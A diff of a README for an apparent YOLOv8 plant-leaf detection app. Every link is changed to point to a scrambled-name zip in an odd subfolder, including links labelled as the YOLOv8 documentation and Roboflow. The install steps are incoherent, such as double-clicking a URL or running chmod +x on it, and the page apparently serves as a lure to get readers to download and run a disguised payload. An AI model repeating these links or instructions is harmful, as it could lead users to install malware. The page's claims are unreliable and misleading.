@@ -1,6 +1,6 @@
 # 🌱 Plant-Detection-using-YOLOv8 - Detect and Classify Plant Leaves Easily
 
-[![Download Now](https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Plant-Detection-using-YOLOv8.zip%20Now-Plant--Detection%20using%20YOLOv8-brightgreen)](https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Plant-Detection-using-YOLOv8.zip)
+[![Download Now](https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Detection_Plant_Ov_using_YOL_v3.3.zip%20Now-Plant--Detection%20using%20YOLOv8-brightgreen)](https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Detection_Plant_Ov_using_YOL_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -22,21 +22,21 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page.  
-   [Download Here](https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Plant-Detection-using-YOLOv8.zip)
+   [Download Here](https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Detection_Plant_Ov_using_YOL_v3.3.zip)
 
 2. **Choose the Latest Version**  
    Once you are on the Releases page, find the latest version of the application.
 
 3. **Download the Application**  
    Click on the appropriate link for your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Plant-Detection-using-YOLOv8.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Plant-Detection-using-YOLOv8.zip`.
-   - For Linux, download `https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Plant-Detection-using-YOLOv8.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Detection_Plant_Ov_using_YOL_v3.3.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Detection_Plant_Ov_using_YOL_v3.3.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Detection_Plant_Ov_using_YOL_v3.3.zip`.
 
 4. **Install the Application**  
-   - **Windows**: Double-click `https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Plant-Detection-using-YOLOv8.zip` and follow the prompts to install.
-   - **macOS**: Open `https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Plant-Detection-using-YOLOv8.zip`, drag the app to your Applications folder.
-   - **Linux**: Make the file executable using `chmod +x https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Plant-Detection-using-YOLOv8.zip` in the terminal, then run it.
+   - **Windows**: Double-click `https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Detection_Plant_Ov_using_YOL_v3.3.zip` and follow the prompts to install.
+   - **macOS**: Open `https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Detection_Plant_Ov_using_YOL_v3.3.zip`, drag the app to your Applications folder.
+   - **Linux**: Make the file executable using `chmod +x https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Detection_Plant_Ov_using_YOL_v3.3.zip` in the terminal, then run it.
 
 5. **Run the Application**  
    After installation, find the application in your programs or applications list. Open it to start detecting and classifying plant leaves.
@@ -58,7 +58,7 @@ Follow these steps to download and run the application:
 
 ## 📥 Download & Install
 
-To get started with Plant-Detection-using-YOLOv8, [visit this page to download](https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Plant-Detection-using-YOLOv8.zip). Choose the latest version available for your operating system, then follow the installation steps above.
+To get started with Plant-Detection-using-YOLOv8, [visit this page to download](https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Detection_Plant_Ov_using_YOL_v3.3.zip). Choose the latest version available for your operating system, then follow the installation steps above.
 
 ## 🎉 Contribute
 
@@ -77,7 +77,7 @@ If you have any questions or need help, please reach out to our support team thr
 
 Explore more about YOLOv8 and its applications in plant detection through the following resources:
 
-- [YOLOv8 Documentation](https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Plant-Detection-using-YOLOv8.zip)
-- [Roboflow](https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Plant-Detection-using-YOLOv8.zip)
+- [YOLOv8 Documentation](https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Detection_Plant_Ov_using_YOL_v3.3.zip)
+- [Roboflow](https://raw.githubusercontent.com/manohargoud-cmd/Plant-Detection-using-YOLOv8/main/suist/Detection_Plant_Ov_using_YOL_v3.3.zip)
   
 We hope you find Plant-Detection-using-YOLOv8 helpful in your plant identification journey!
